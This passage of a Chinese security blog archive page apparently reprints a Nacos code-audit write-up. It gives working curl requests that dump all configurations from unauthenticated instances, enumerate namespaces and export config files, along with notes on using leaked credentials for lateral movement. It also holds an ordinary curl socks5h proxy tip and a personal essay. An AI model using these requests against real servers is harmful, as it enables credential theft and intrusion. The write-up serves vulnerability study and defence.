<span class="variable">NACOS_SERVER_VERSION_V2</span> <span class="operator">=</span> <span class="string">&quot;/v2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_NACOS_CORE_CONTEXT</span> <span class="operator">=</span> NACOS_SERVER_VERSION + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT</span> <span class="operator">=</span> DEFAULT_NACOS_CORE_CONTEXT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT_V2</span> <span class="operator">=</span> NACOS_SERVER_VERSION_V2 + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到有V1、V2两种API接口，我们根据不同类型再具体分析。</p>
+</blockquote>
+<h3><span id="获取配置数据">获取配置数据</span></h3><blockquote>
+<p>根据官方OpenAPI的说明，你需要知道dataId与group的值，才能读取到对应的配置文件，如果留空或者不填，则会无法读取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>事实真的是这样吗？<br>我们看一下<code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code>文件中369行开始的代码。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Query the configuration information and return it in JSON format.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=accurate&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">searchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId, <span class="meta">@RequestParam(&quot;group&quot;)</span> String group,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfo4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Fuzzy query configuration information. Fuzzy queries based only on content are not allowed, that is, both dataId</span></span><br><span class="line"><span class="comment">    * and group are NULL, but content is not NULL. In this case, all configurations are returned.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=blur&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">fuzzySearchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;group&quot;)</span> String group, <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       MetricsMonitor.getFuzzySearchMonitor().incrementAndGet();</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">50</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfoLike4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到首先先进行了<code>signType = SignType.CONFIG</code>的权限检查，这里的<code>signType</code>的一个作用就是检查<code>auth</code>是否开启，但是之前也提到过，<code>auth</code>是默认不开启的。接着我们继续分析，当参数<code>search=accurate</code>时，从GET请求中获取参数<code>dataId、group、appName、tenant、config_tags、pageNo、pageSize</code>参数，其中<code>appName、tenant、config_tags</code>不是必填的，接着先检查<code>appName</code>和<code>configTags</code>是否为空，我们直接留空或者不填就能绕过这个判断，然后接下来就是迷之操作了，直接给我全部返回了。<br>所以我们直接构造参数，就可以发现能够获取全部的配置文件了。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>但这里有个问题，这只能获取默认命名空间<code>public</code>里面的数据，但是现在有大聪明已经学会了不把数据放到默认的<code>public</code>，而是自己重新建一个<code>namespace</code>，再把企业的相关配置放在里面，这里留个伏笔，我们接着往下看。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="获取其他namespace的配置数据">获取其他Namespace的配置数据</span></h3><blockquote>
+<p>根据官方的OpenAPI文档描述，可以直接请求获取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们查看对应的代码，处理<code>namespace</code>的代码在<code>nacos/console/src/main/java/com/alibaba/nacos/console/controller/NamespaceController.java</code>这里，我们看从48行开始的代码，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/v1/console/namespaces&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NamespaceController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommonPersistService commonPersistService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> NamespaceOperationService namespaceOperationService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">namespaceIdCheckPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[\\w-]+&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAMESPACE_ID_MAX_LENGTH</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get namespace list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> namespace list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> RestResult&lt;List&lt;Namespace&gt;&gt; <span class="title function_">getNamespaces</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.success(namespaceOperationService.getNamespaceList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这样一看上去，直接访问就能获取到<code>Namespace</code>列表，我们再跟一下<code>namespaceOperationService.getNamespaceList()</code>:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Namespace&gt; <span class="title function_">getNamespaceList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 获取用kp</span></span><br><span class="line">        List&lt;TenantInfo&gt; tenantInfos = commonPersistService.findTenantByKp(DEFAULT_KP);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Namespace</span> <span class="variable">namespace0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(<span class="string">&quot;&quot;</span>, DEFAULT_NAMESPACE, DEFAULT_QUOTA,</span><br><span class="line">                configInfoPersistService.configInfoCount(DEFAULT_TENANT), NamespaceTypeEnum.GLOBAL.getType());</span><br><span class="line">        List&lt;Namespace&gt; namespaceList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        namespaceList.add(namespace0);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (TenantInfo tenantInfo : tenantInfos) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">configCount</span> <span class="operator">=</span> configInfoPersistService.configInfoCount(tenantInfo.getTenantId());</span><br><span class="line">            <span class="type">Namespace</span> <span class="variable">namespaceTmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(tenantInfo.getTenantId(), tenantInfo.getTenantName(),</span><br><span class="line">                    tenantInfo.getTenantDesc(), DEFAULT_QUOTA, configCount, NamespaceTypeEnum.CUSTOM.getType());</span><br><span class="line">            namespaceList.add(namespaceTmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> namespaceList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看上去也没有做什么限制，我们直接访问发现可以直接读到非public的Namespace，就是上面我们创建名叫REDTEAM的test_namespace命名空间。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/5.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这时候我们已经拿到了namespace、namespaceShowNmae，我们就可以根据之前的API光明正大的进行读取操作了，这里有个小技巧，之前读取配置里面的tenant参数获取的就是namespce，我们直接把tenant&#x3D;test_namespace加进去构造请求，轻松读取到非public空间的数据。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="配置文件导出">配置文件导出</span></h3><blockquote>
+<p>就在我看上面上面这部分代码的时候，我们无意中发现了一个下载文件的接口，还是这个文件，找到了疑似导出配置文件的接口，我们继续跟进一下。<br><code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>接着我们在482行看到了相关代码。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>根据逻辑，我们很轻松的构造出下载的链接，跟上面的类似，其中tenant为空默认下载public命名空间，如果要下载其他命名空间的配置文件则重复之前的先获取Namespace即可。</p>
+</blockquote>
+<blockquote>
+<p><code>http://192.168.20.144:8848/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</code></p>
+</blockquote>
+<h2><span id="后记">后记</span></h2><blockquote>
+<p>现在来看，之所以因为官方觉得不开启auth不算是漏洞，是因为根据官网OpenAPI来看，你需要知道具体的 Data Id 以及 Group才能读到具体配置，但是攻击者总能够通过代码审计的方法找到其他参数进行绕过。<br>目前攻防对抗实战中，Nacos的环境遇到非常多，并且无一例外都没有开启auth，很多防守方甚至只是用防火墙阻断网上公开的那几条exp利用的关键地址，Nacos里面保存了企业很多的配置文件比如数据库连接信息、AK&#x2F;SK信息等等，拿到账号密码等信息之后用来做密码本，然后再进行内网横向，杀伤力非常之大。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html">https://nacos.io/en-us/docs/auth.html</a><br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nacos/" rel="tag">Nacos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/04/Curl-Socks5h-x/">
+                Curl-Socks5h-x
+            </a>
+        </h2>
+    
+    <time>
+        Jul 4, 2023
+    </time>
+    <section class="content">
+        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
+</blockquote>
+<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
+<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
+<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
+</blockquote>
+<blockquote>
+<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
+</blockquote>
+<blockquote>
+<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
+</blockquote>
+<blockquote>
+<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
+</blockquote>
+<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
+<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>代中代(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
+</blockquote>
+<blockquote>
+<p>希望两岸互相少点偏见吧</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/06/27/Towards-The-Sun/">
+                向阳行（Towards The Sun）
+            </a>
+        </h2>
+    
+    <time>
+        Jun 27, 2023
+    </time>
+    <section class="content">
+        <h1><span id="向阳行towards-the-sun">向阳行（Towards The Sun）</span></h1><p><img src="/2023/06/27/Towards-The-Sun/1.jpg" alt="image"></p>
+<blockquote>
+<p>首先我得解释，我直到2023年1月17日，也就是除夕前几天，我还在更新另一篇<a target="_blank" rel="noopener" href="https://szczecin.github.io/2022/08/09/How-To-Hunt/">斯卡蒂的赏金猎人之旅（SRC）</a> 的内容<br>只不过一直没有push到博客上，包括现在写的这篇，今晚写的4篇，很大原因是数据传输的问题</p>
+<p>要知道，在大公司，对员工的数据信息管得很严，要进行审查，我写的东西有很多涉及到漏洞细节<br>上次我把移动硬盘接电脑，里面有我的博客环境和写的文章，吓了领导一跳，以为我在拷数据啥的</p>
+<p>那没办法，真不是我懒，不让搞啊！而且确实工作到没有时间……（那你为什么又开始写了呢？）<br>……<br>这就问得好了，“暑期大作战”开始了，周二周四都要加班到21点，周六还可能要来上班<br>我不想晚上继续加班，就做点自己的事情吧，晚上工作效率很低，真的<br>……<br>其实我真的搞不懂，一个人把自己全部精力投入在早上的8h里，效率真的不低了，还需要额外时间，是希望他早上8h不再那么专注，鼓励摸鱼吗？然后把东西放到晚上做？<br>（那肯定不是，是希望你继续做，做的更多）<br>那不就违背了多劳多得？甚至多劳少得、不得</p>
+</blockquote>
+<p><img src="/2023/06/27/Towards-The-Sun/2.jpg" alt="image"></p>
+<blockquote>
+<p>所以望眼欲穿，开始思考自己的下一站；<br>所以望眼欲穿，期盼时间快快来到年关</p>
+</blockquote>
+<p><img src="/2023/06/27/Towards-The-Sun/3.jpg" alt="image"></p>
+<blockquote>
+<p>这篇文章叫“向阳行”（Towards The Sun），是因为在写完这篇时，刚好随机到Rihanna的《Towards The Sun》，好一些的翻译自然是“逐日”，但是不想如此。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    
+    <a class="prev" rel="prev" href="/archives/2023/page/4/">
+      <span class="icon icon-chevron-left"></span>
+      <span class="text">Previous</span>
+    </a>
+    
+    
+    <a class="next" rel="next" href="/archives/2023/page/6/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
+    
+  </nav>
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
